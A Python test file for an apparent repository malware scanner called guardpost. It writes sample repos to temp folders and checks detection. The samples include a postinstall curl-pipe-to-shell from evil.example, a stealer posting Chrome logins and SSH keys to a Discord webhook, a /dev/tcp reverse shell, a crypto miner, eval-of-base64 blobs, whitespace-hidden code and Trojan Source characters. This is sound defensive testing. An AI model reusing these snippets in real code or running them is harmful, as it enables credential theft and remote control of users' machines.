"""Scanner tests. Each sample repo is written to a temp folder at test time
(so this repo never carries anything that looks like malware) and is only
read by the scanner, never run.

    python3 -I tests/test_scanner.py
"""
import base64
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from guardpost import popular  # noqa: E402
from guardpost.scanner import HIGH, MEDIUM, Scan  # noqa: E402

# Samples are assembled from pieces so this file itself doesn't match the
# rules (guardpost scans its own source clean). J joins the pieces.
J = "".join
DEV_TCP = J(["/dev/", "tcp/"])
HOOK = J(["https://discord.com/api/", "webhooks/1/x"])
EVAL_ATOB = J(["ev", "al(at", "ob("])
RLO, LRI, PDI = chr(0x202E), chr(0x2066), chr(0x2069)


def repo(files: dict) -> Path:
    root = Path(tempfile.mkdtemp(prefix="gp-test-"))
    for name, content in files.items():
        p = root / name
        p.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            p.write_bytes(content)
        else:
            p.write_text(content)
    return root


def titles(root: Path, sev=None):
    s = Scan(root).run()
    return {f.what for f in s.findings if sev is None or f.severity == sev}, s


class Malicious(unittest.TestCase):
    def test_postinstall_downloader(self):
        t, s = titles(repo({"package.json": json.dumps(
            {"name": "x", "scripts": {"postinstall": J(["cu", "rl -s https://evil.example/p.sh | sh"])}})}), HIGH)
        self.assertIn("npm 'postinstall' downloads or runs hidden code", t)
        self.assertEqual(s.verdict(), "danger")

    def test_postinstall_runs_flagged_file(self):
        t, _ = titles(repo({
            "package.json": json.dumps({"name": "x", "scripts": {"postinstall": "node setup.js"}}),
            "setup.js": "const c=require('child_process');" + EVAL_ATOB + "'ZWNobyBoaQ=='))\n"}), HIGH)
        self.assertIn("npm 'postinstall' runs a file that was flagged", t)

    def test_hidden_right(self):
        line = "module.exports = { content: [] };" + " " * 300 + "require('child_process').exec(process.env.X);"
        t, _ = titles(repo({"tailwind.config.js": line + "\n"}), HIGH)
        self.assertIn("Code hidden off the right edge of the screen", t)

    def test_stealer(self):
        code = ("import os, requests\n"
                "p = os.path.expanduser('~/.config/google-chrome/Default/" + J(["Login", " Data"]) + "')\n"
                "k = os.path.expanduser('~/." + J(["ssh/id", "_rsa"]) + "')\n"
                f"requests.post('{HOOK}', files={{'a': open(p,'rb')}})\n")
        t, _ = titles(repo({"tool/util.py": code}))
        self.assertIn("Reads passwords/keys/wallets and sends data out", t)
        self.assertIn("Sends data to a drop box", t)

    def test_reverse_shell(self):
        t, _ = titles(repo({"run.sh": "#!/bin/sh\n" + J(["bash -i ", ">& "]) + DEV_TCP + "10.0.0.1/4444 0>&1\n"}), HIGH)
        self.assertIn("Reverse shell", t)

    def test_setup_py_download(self):
        t, _ = titles(repo({"setup.py": "import urllib.request\nfrom setuptools import setup\n" +
                                        J(["urllib.request.url", "open('http://x/y')\nsetup(name='x')\n"])}), HIGH)
        self.assertIn("setup.py does more than describe the package", t)

    def test_vscode_folder_open(self):
        t, _ = titles(repo({".vscode/tasks.json": json.dumps({"version": "2.0.0", "tasks": [
            {"label": "x", "command": "node .vscode/x.js", "runOptions": {"runOn": J(["folder", "Open"])}}]}).replace(
            '"runOptions": {"runOn"', '"runOptions": {"runOn"')}), HIGH)
        self.assertIn("Runs a command as soon as you open the folder in VS Code", t)

    def test_disguised_program(self):
        t, _ = titles(repo({"assets/logo.png": bytes([0x7F]) + b"EL" + b"F\x02\x01\x01" + b"\x00" * 100}), HIGH)
        self.assertIn("Program disguised as a data file", t)

    def test_trojan_source(self):
        t, _ = titles(repo({"auth.js": "if (role != 'admin" + RLO + " " + LRI + "// check" + PDI + " " + LRI + "') {}\n"}), HIGH)
        self.assertIn("Invisible text-direction characters (Trojan Source)", t)

    def test_eval_blob(self):
        blob = base64.b64encode(os.urandom(600)).decode()
        t, _ = titles(repo({"index.js": f"const d = '{blob}';\n" + J(["ev", "al(Buf", "fer.from(d,'base64').toString())\n"])}), HIGH)
        self.assertIn("Large encoded blob next to code that runs it", t)

    def test_obfuscated_js(self):
        body = ";".join(f"var {'_' + '0x'}{i:04x}={'_' + '0x'}{i+1:04x}" for i in range(40))
        t, _ = titles(repo({"lib/a.js": body + "\n"}), HIGH)
        self.assertIn("Scrambled JavaScript (obfuscator output)", t)

    def test_typosquat(self):
        t, _ = titles(repo({"package.json": json.dumps({"dependencies": {"axois": "^1.0.0", "react": "18"}}),
                            "requirements.txt": "reqeusts==2.0\nnumpy\n"}), HIGH)
        self.assertIn("Look-alike package name", t)

    def test_miner(self):
        t, _ = titles(repo({"start.sh": "./" + J(["xm", "rig -o str", "atum+tcp://pool:3333\n"])}), HIGH)
        self.assertIn("Crypto miner", t)

    def test_locked_zip(self):
        # minimal zip whose entry has the "encrypted" flag set
        import zipfile
        root = repo({})
        with zipfile.ZipFile(root / "data.zip", "w") as z:
            z.writestr("a.txt", "x")
        raw = bytearray((root / "data.zip").read_bytes())
        for sig in (b"PK\x03\x04", b"PK\x01\x02"):
            i = raw.find(sig)
            off = 6 if sig == b"PK\x03\x04" else 8
            raw[i + off] |= 1
        (root / "data.zip").write_bytes(bytes(raw))
        t, _ = titles(root, HIGH)
        self.assertIn("Password-protected archive", t)


class Layer2(unittest.TestCase):
    def test_pth_autorun(self):
        t, _ = titles(repo({"evil.pth": J(["imp", "ort os; os.system('id')\n"]), "ok.pth": "some/path\n"}), HIGH)
        self.assertIn("Runs code every time Python starts (.pth file)", t)

    def test_integrity(self):
        import hashlib
        from guardpost import deps
        data = b"package"
        good = "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()
        self.assertTrue(deps._check_integrity(data, good))
        self.assertFalse(deps._check_integrity(b"swapped", good))

    def test_npm_tree(self):
        from guardpost import deps
        lock = {"packages": {"": {"name": "app"},
                             "node_modules/a": {"version": "1.0.0", "hasInstallScript": True, "resolved": "https://r/a.tgz"},
                             "node_modules/@s/b": {"version": "2.0.0"},
                             "node_modules/c": {"link": True}}}
        tree = deps._npm_tree(lock)
        self.assertEqual([(p["name"], p["scripts"]) for p in tree], [("a", True), ("@s/b", False)])

    def test_reverse_shell_not_dup2_devnull(self):
        t, _ = titles(repo({"console.py": "os.dup2(devnull, sys.stdout.fileno())\n"}), HIGH)
        self.assertNotIn("Reverse shell", t)
        t, _ = titles(repo({"x.py": J(["os.du", "p2(s.fileno(), 0)\n"])}), HIGH)
        self.assertIn("Reverse shell", t)


class Clean(unittest.TestCase):
    def test_ordinary_project(self):
        _, s = titles(repo({
            "package.json": json.dumps({"name": "app", "scripts": {"prepare": "husky install", "build": "vite build"},
                                        "dependencies": {"react": "18", "axios": "1"}}),
            "src/main.js": "import axios from 'axios';\nexport const get = u => axios.get(u);\n",
            "README.md": "Install: curl -fsSL https://example.com/install.sh | sh\n",
            "requirements.txt": "requests>=2\nnumpy\n",
            "app.py": "import requests\nprint(requests.get('https://api.github.com').status_code)\n"}))
        self.assertEqual(s.verdict(), "clean", [f.what for f in s.findings])

    def test_lookalike_helper(self):
        self.assertEqual(popular.lookalike("lodahs", "npm"), "lodash")
        self.assertIsNone(popular.lookalike("lodash", "npm"))
        self.assertIsNone(popular.lookalike("left-pad", "npm"))
        self.assertEqual(popular.lookalike("python-dateutils", "pypi"), "python-dateutil")


if __name__ == "__main__":
    unittest.main(verbosity=1)
